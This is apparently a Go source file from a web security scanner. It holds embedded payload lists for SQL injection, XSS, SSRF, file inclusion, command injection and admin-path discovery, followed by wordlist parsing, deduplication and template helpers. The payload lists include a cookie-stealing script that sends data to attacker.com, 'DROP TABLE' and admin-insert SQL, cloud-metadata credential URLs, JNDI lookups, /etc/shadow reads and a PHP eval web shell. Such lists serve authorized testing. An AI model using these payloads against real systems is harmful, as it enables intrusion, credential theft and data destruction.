// Package wordlist 提供智能词表管理功能。
//
// 主要能力:
//   1. 内嵌常见漏洞 payload 字典（SQLi、XSS、SSRF、LFI、RCE 等）
//   2. 词表格式自动检测（编码、分隔符、注释行、空行）
//   3. 词表统计（行数、唯一值、重复值、分类占比）
//   4. Payload 自动生成（基于占位符和变量构造探测 payload）
package wordlist

import (
	"sort"
	"strings"
)

// Entry 表示词表中的一行,包含原始值和分类标签。
type Entry struct {
	Value  string
	Category string
}

// Stats 记录词表的统计信息。
type Stats struct {
	TotalLines   int
	UniqueValues int
	Duplicates   int
	Categories   map[string]int // 按分类统计
}

// ─────────────────────────────────────────────────────────────────────────────
// 内嵌 payload 字典
// ─────────────────────────────────────────────────────────────────────────────

// SQLiPayloads 是常见的 SQL 注入探测 payload。
var SQLiPayloads = []Entry{
	// 基础探测
	{"'", "basic"},
	{"\"", "basic"},
	{"' OR '1'='1", "basic"},
	{"' OR 1=1--", "basic"},
	{"' OR '1'='1' --", "basic"},
	{"' UNION SELECT NULL--", "union"},
	{"' UNION SELECT NULL,NULL--", "union"},
	{"' UNION SELECT NULL,NULL,NULL--", "union"},
	{"' UNION SELECT 1,2,3--", "union"},
	// 错误注入
	{"' AND 1=1--", "error"},
	{"' AND 1=2--", "error"},
	{"' AND SLEEP(5)--", "time"},
	{"' OR SLEEP(5)--", "time"},
	{"'; WAITFOR DELAY '0:0:5'--", "time"},
	{"benchmark(10000000,SHA1('test'))--", "time"},
	// 堆叠查询
	{"'; DROP TABLE users--", "stack"},
	{"'; INSERT INTO admin VALUES('hacker','hacker')--", "stack"},
	// 编码绕过
	{"%27", "encode"},
	{"%27%20OR%20%271%27%3D%271", "encode"},
	{"%27%20UNION%20SELECT%20NULL--", "encode"},
	{"' OR 1=1 --+", "encode"},
	{"' or '1'='1", "encode"},
	{"%2527", "encode"},
	{"%25%2527", "encode"},
	{"%25%2527%2520OR%25201%253D1", "encode"},
	// 注释绕过
	{"'/**/OR/**/1=1--", "comment"},
	{"'/*!50000OR*/1=1--", "comment"},
	{"'-1'+' OR '+'1'='1", "comment"},
	{"' OR 'a'='a", "comment"},
	// 类型转换
	{"' AND CAST((SELECT version()) AS INT)=version()--", "cast"},
	// 常见字段探测
	{"' UNION SELECT table_name FROM information_schema.tables--", "schema"},
	{"' UNION SELECT column_name FROM information_schema.columns--", "schema"},
	{"' UNION SELECT 1,@@version,3--", "version"},
}

// XSSPayloads 是常见的 XSS 探测 payload。
var XSSPayloads = []Entry{
	// 基础
	{"<script>alert(1)</script>", "basic"},
	{"<img src=x onerror=alert(1)>", "img"},
	{"<svg onload=alert(1)>", "svg"},
	{"<body onload=alert(1)>", "body"},
	{"<iframe src='javascript:alert(1)'>", "iframe"},
	// 编码绕过
	{"%3Cscript%3Ealert(1)%3C/script%3E", "encode"},
	{"&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "encode"},
	{"<scr%00ipt>alert(1)</script>", "encode"},
	{"<script >alert(1)</script>", "encode"},
	{"<script>alert(String.fromCharCode(88,83,83))</script>", "encode"},
	// 事件属性
	{"<div onfocus=alert(1) tabindex=1></div>", "event"},
	{"<input onblur=alert(1) autofocus>", "event"},
	{"<marquee onstart=alert(1)>", "event"},
	{"<video><source onerror=alert(1)>", "event"},
	// HTML5
	{"<details open ontoggle=alert(1)>", "html5"},
	{"<input type=image src=x onerror=alert(1)>", "html5"},
	{"<body background='javascript:alert(1)'>", "html5"},
	{"<link rel=import href='javascript:alert(1)'>", "html5"},
	// 存储型
	{"<script>document.location='http://attacker.com/steal?c='+document.cookie</script>", "stored"},
}

// SSRFPayloads 是常见的 SSRF 探测 payload。
var SSRFPayloads = []Entry{
	// 基础探测
	{"http://127.0.0.1", "basic"},
	{"http://localhost", "basic"},
	{"http://169.254.169.254/latest/meta-data/", "cloud"},
	{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "cloud"},
	{"http://metadata.google.internal/computeMetadata/v1/", "cloud"},
	{"http://10.0.0.1", "internal"},
	{"http://192.168.0.1", "internal"},
	{"http://192.168.1.1", "internal"},
	{"http://0.0.0.0", "internal"},
	// Gopher 协议
	{"gopher://127.0.0.1:6379/_INFO", "gopher"},
	{"gopher://127.0.0.1:25/_MAIL%20FROM:<root>@127.0.0.1", "gopher"},
	{"gopher://127.0.0.1:21/_USER%20anonymous%0D%0APASS%20test%0D%0A", "gopher"},
	{"gopher://127.0.0.1:3306/_SELECT%201", "gopher"},
	// 编码绕过
	{"http://127.0.0.1", "encode"},
	{"http://0x7f000001", "encode"},
	{"http://2130706433", "encode"},
	{"http://0177.0.0.1", "encode"},
	{"http://[::1]", "encode"},
	// 反引号
	{"${jndi:ldap://127.0.0.1:1389/a}", "jndi"},
	{"${jndi:rmi://127.0.0.1:1099/a}", "jndi"},
}

// LFIPayloads 是常见的文件包含/读取探测 payload。
var LFIPayloads = []Entry{
	// 基础
	{"../../../etc/passwd", "unix"},
	{"../../etc/passwd", "unix"},
	{"....//....//etc/passwd", "unix"},
	{"%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "unix"},
	{"..%2f..%2f..%2fetc%2fpasswd", "unix"},
	{"..%5c..%5c..%5cetc%5cpasswd", "unix"},
	// Windows
	{"C:\\\\Windows\\\\win.ini", "windows"},
	{"C:/Windows/win.ini", "windows"},
	{"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts", "windows"},
	// 特殊文件
	{"/proc/self/environ", "proc"},
	{"/proc/version", "proc"},
	{"/etc/shadow", "unix"},
	{"/etc/hosts", "unix"},
	{"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "windows"},
	{"....//....//....//etc/passwd", "traversal"},
	{"..%252f..%252f..%252fetc%252fpasswd", "encode"},
	{"%252e%252e/%252e%252e/etc/passwd", "encode"},
	{"..%255c..%255c..%255cetc%255cpasswd", "encode"},
}

// RCEPayloads 是常见的远程代码执行探测 payload。
var RCEPayloads = []Entry{
	// 命令注入
	{"| ls", "cmd"},
	{"|| whoami", "cmd"},
	{"& whoami", "cmd"},
	{"&& cat /etc/passwd", "cmd"},
	{"`id`", "cmd"},
	{"$(whoami)", "cmd"},
	{"$(cat /etc/passwd)", "cmd"},
	{"; id", "cmd"},
	{"| id", "cmd"},
	{"| cat /etc/passwd", "cmd"},
	// PHP
	{"<?php system('id'); ?>", "php"},
	{"<?php echo shell_exec('id'); ?>", "php"},
	{"<?php system('cat /etc/passwd'); ?>", "php"},
	{"<?php eval($_GET['cmd']); ?>", "php"},
	{"<?php phpinfo(); ?>", "php"},
	{"<% system('id'); %>", "asp"},
	{"<% =Runtime.getRuntime().exec('id') %>", "jsp"},
	// 包含
	{"?file=php://filter/convert.base64-encode/resource=index.php", "php-filter"},
	{"?file=php://input", "php-input"},
	{"?file=expect://id", "php-expect"},
}

// PathPayloads 是常见的路径探测 payload（用于 API 路径发现）。
var PathPayloads = []Entry{
	{"/api/v1", "api"},
	{"/api/v2", "api"},
	{"/v1", "api"},
	{"/v2", "api"},
	{"/admin", "admin"},
	{"/admin/login", "admin"},
	{"/admin/panel", "admin"},
	{"/console", "admin"},
	{"/debug", "admin"},
	{"/actuator", "actuator"},
	{"/actuator/env", "actuator"},
	{"/actuator/health", "actuator"},
	{"/actuator/info", "actuator"},
	{"/actuator/mappings", "actuator"},
	{"/swagger-ui.html", "swagger"},
	{"/swagger-ui/", "swagger"},
	{"/v2/api-docs", "swagger"},
	{"/graphql", "graphql"},
	{"/graphiql", "graphql"},
	{"/papi", "papi"},
	{"/robots.txt", "info"},
	{"/sitemap.xml", "info"},
	{"/.git/HEAD", "git"},
	{"/.env", "env"},
	{"/wp-login.php", "wp"},
	{"/wp-admin/", "wp"},
	{"/phpmyadmin/", "admin"},
	{"/manager/html", "tomcat"},
	{"/jmxconsole/", "jmx"},
}

// AllBuiltins 返回所有内嵌 payload 字典的分类名称和条目。
func AllBuiltins() []map[string][]Entry {
	return []map[string][]Entry{
		{"sqli": SQLiPayloads},
		{"xss": XSSPayloads},
		{"ssrf": SSRFPayloads},
		{"lfi": LFIPayloads},
		{"rce": RCEPayloads},
		{"path": PathPayloads},
	}
}

// GetCategoryPayloads 返回指定分类的 payload。
func GetCategoryPayloads(category string) []Entry {
	for _, m := range AllBuiltins() {
		if entries, ok := m[category]; ok {
			return entries
		}
	}
	return nil
}

// ─────────────────────────────────────────────────────────────────────────────
// 格式检测
// ─────────────────────────────────────────────────────────────────────────────

// FormatInfo 描述词表的格式特征。
type FormatInfo struct {
	HasBOM      bool
	HasComments bool
	HasEmpty    bool
	Delimiter   string // 如果非空，说明按分隔符分割
	Encoding    string // "utf-8" / "gbk" / "ascii"
	LineCount   int
	SingleLine  bool // 是否每行一个值
}

// DetectFormat 自动检测词表内容的格式。
func DetectFormat(data []byte) FormatInfo {
	info := FormatInfo{
		Encoding: "ascii",
		LineCount: 0,
	}

	// BOM 检测
	if len(data) >= 3 && data[0] == 0xEF && data[1] == 0xBB && data[2] == 0xBF {
		info.HasBOM = true
		data = data[3:]
		info.Encoding = "utf-8"
	} else if len(data) >= 2 && data[0] == 0xFF && data[1] == 0xFE {
		info.HasBOM = true
		data = data[2:]
		info.Encoding = "utf-16le"
	} else if len(data) >= 2 && data[0] == 0xFE && data[1] == 0xFF {
		info.HasBOM = true
		data = data[2:]
		info.Encoding = "utf-16be"
	} else {
		info.Encoding = "ascii"
	}

	lines := strings.Split(string(data), "\n")
	total := 0
	commentLines := 0
	emptyLines := 0
	singleLine := true

	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			emptyLines++
			continue
		}
		total++
		if strings.HasPrefix(trimmed, "#") || strings.HasPrefix(trimmed, "//") {
			commentLines++
		}
		// 多行 payload（如 base64、json）时 SingleLine = false
		if strings.Contains(trimmed, "\n") || strings.Contains(trimmed, "|") {
			singleLine = false
		}
	}

	info.LineCount = total
	info.HasComments = commentLines > 0
	info.HasEmpty = emptyLines > 0
	info.SingleLine = singleLine

	return info
}

// ─────────────────────────────────────────────────────────────────────────────
// 统计
// ─────────────────────────────────────────────────────────────────────────────

// ComputeStats 计算词表的统计信息。
func ComputeStats(entries []Entry) Stats {
	stats := Stats{
		TotalLines: len(entries),
		Categories: make(map[string]int),
	}

	seen := make(map[string]int, len(entries))
	for _, e := range entries {
		seen[e.Value]++
		if e.Category != "" {
			stats.Categories[e.Category]++
		}
	}

	stats.UniqueValues = len(seen)
	stats.Duplicates = 0
	for _, count := range seen {
		if count > 1 {
			stats.Duplicates += count - 1
		}
	}

	// Sort categories by count
	sorted := make([]string, 0, len(stats.Categories))
	for k := range stats.Categories {
		sorted = append(sorted, k)
	}
	sort.Strings(sorted)
	_ = sorted

	return stats
}

// ─────────────────────────────────────────────────────────────────────────────
// 清理与规范化
// ─────────────────────────────────────────────────────────────────────────────

// Deduplicate 去除重复值（保留首次出现的顺序）。
func Deduplicate(entries []Entry) []Entry {
	seen := make(map[string]bool, len(entries))
	result := make([]Entry, 0, len(entries))
	for _, e := range entries {
		key := strings.ToLower(strings.TrimSpace(e.Value))
		if !seen[key] {
			seen[key] = true
			result = append(result, e)
		}
	}
	return result
}

// FilterEmpty 去除空值和纯空白值。
func FilterEmpty(entries []Entry) []Entry {
	result := make([]Entry, 0, len(entries))
	for _, e := range entries {
		if strings.TrimSpace(e.Value) == "" {
			continue
		}
		result = append(result, e)
	}
	return result
}

// FilterComments 去除注释行（以 # 或 // 开头的行）。
func FilterComments(entries []Entry) []Entry {
	result := make([]Entry, 0, len(entries))
	for _, e := range entries {
		trimmed := strings.TrimSpace(e.Value)
		if strings.HasPrefix(trimmed, "#") || strings.HasPrefix(trimmed, "//") {
			continue
		}
		result = append(result, e)
	}
	return result
}

// ─────────────────────────────────────────────────────────────────────────────
// 占位符注入
// ─────────────────────────────────────────────────────────────────────────────

// InjectPlaceholder 将占位符 {{key}} 替换为指定值，支持所有条目。
func InjectPlaceholder(entries []Entry, key, value string) []Entry {
	phKey := "{{" + key + "}}"
	result := make([]Entry, 0, len(entries))
	for _, e := range entries {
		updated := strings.ReplaceAll(e.Value, phKey, value)
		result = append(result, Entry{
			Value:    updated,
			Category: e.Category,
		})
	}
	return result
}

// GenerateFromTemplate 基于模板和变量列表生成组合 payload。
// 支持 {{key}} 占位符，每个 key 遍历 values。
func GenerateFromTemplate(template string, vars map[string][]string) []Entry {
	if len(vars) == 0 {
		return []Entry{{Value: template, Category: "generated"}}
	}

	// 收集所有 key
	keys := make([]string, 0, len(vars))
	for k := range vars {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	// 递归生成组合
	result := []string{template}
	for _, key := range keys {
		values := vars[key]
		if len(values) == 0 {
			continue
		}
		var expanded []string
		for _, r := range result {
			for _, v := range values {
				expanded = append(expanded, strings.ReplaceAll(r, "{{"+key+"}}", v))
			}
		}
		result = expanded
	}

	entries := make([]Entry, 0, len(result))
	for _, r := range result {
		entries = append(entries, Entry{Value: r, Category: "generated"})
	}
	return entries
}

// ─────────────────────────────────────────────────────────────────────────────
// 字符串列表加载
// ─────────────────────────────────────────────────────────────────────────────

// ParseLines 将文本按行解析为 Entry 列表。自动跳过空行和注释行。
func ParseLines(data []byte) []Entry {
	lines := strings.Split(string(data), "\n")
	var entries []Entry
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" || strings.HasPrefix(trimmed, "#") || strings.HasPrefix(trimmed, "//") {
			continue
		}
		entries = append(entries, Entry{
			Value:    trimmed,
			Category: "manual",
		})
	}
	return entries
}

// ParseDelimited 按分隔符解析词表（如逗号、分号、空格分隔）。
func ParseDelimited(data []byte, delimiter string) []Entry {
	text := string(data)
	parts := strings.Split(text, delimiter)
	var entries []Entry
	for _, p := range parts {
		trimmed := strings.TrimSpace(p)
		if trimmed == "" || strings.HasPrefix(trimmed, "#") {
			continue
		}
		entries = append(entries, Entry{
			Value:    trimmed,
			Category: "manual",
		})
	}
	return entries
}
